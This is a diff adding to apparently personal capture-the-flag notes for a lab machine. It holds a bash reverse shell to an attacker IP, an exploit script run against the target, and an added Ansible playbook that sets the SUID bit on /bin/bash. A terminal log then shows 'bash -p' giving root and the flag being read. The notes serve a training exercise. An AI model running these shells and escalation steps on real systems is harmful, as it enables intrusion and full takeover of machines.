@@ -122,6 +122,70 @@ bash -c "bash -i >& /dev/tcp/10.10.16.24/443 0>&1"
 └─$ python3 afterglow.py http://10.10.11.204:8080/ 10.10.16.24 1234
 python3 afterglow.py http://10.10.11.204:8080/ 10.10.16.24 1234   
 
+
+playbook_2.yml
+
+- hosts: localhost
+  tasks:
+    - name: Get Root
+      command: chmod u+s /bin/bash
+      become: true
+
+
+```
+bash-5.0$ echo "- hosts: localhost
+  tasks:
+    - name: Get Root
+      command: chmod u+s /bin/bash
+      become: true
+      echo "- hosts: localhost
+>   tasks:
+>     - name: Get Root
+>       command: chmod u+s /bin/bash
+>       become: true
+> " > playbook_2.yml
+      " > playbook_2.yml
+bash-5.0$ ls -al
+ls -al
+total 16
+drwxrwxr-x 2 root staff 4096 Jun 21 23:54 .
+drwxr-xr-x 3 root root  4096 Oct 20  2022 ..
+-rw-r--r-- 1 root root   150 Jun 21 23:54 playbook_1.yml
+-rw-rw-r-- 1 phil phil   110 Jun 21 23:54 playbook_2.yml
+bash-5.0$ cat playbook_2.yml
+cat playbook_2.yml
+- hosts: localhost
+  tasks:
+    - name: Get Root
+      command: chmod u+s /bin/bash
+      become: true
+      
+bash-5.0$ ls /bin/bash 0al
+ls /bin/bash 0al
+ls: cannot access '0al': No such file or directory
+/bin/bash
+bash-5.0$ ls /bin/bash -al
+ls /bin/bash -al
+-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
+bash-5.0$ whoami
+whoami
+phil
+bash-5.0$ bash -p
+bash -p
+bash-5.0# whoami
+whoami
+root
+bash-5.0# cd /root
+cd /root
+bash-5.0# cat root.txt
+cat root.txt
+70ea847e2946b2b9f2da8fc9172a45b2
+
+```
+
+how does /bin/bash -p work
+
+
 # lessons 
 
 1. Always check for LFI
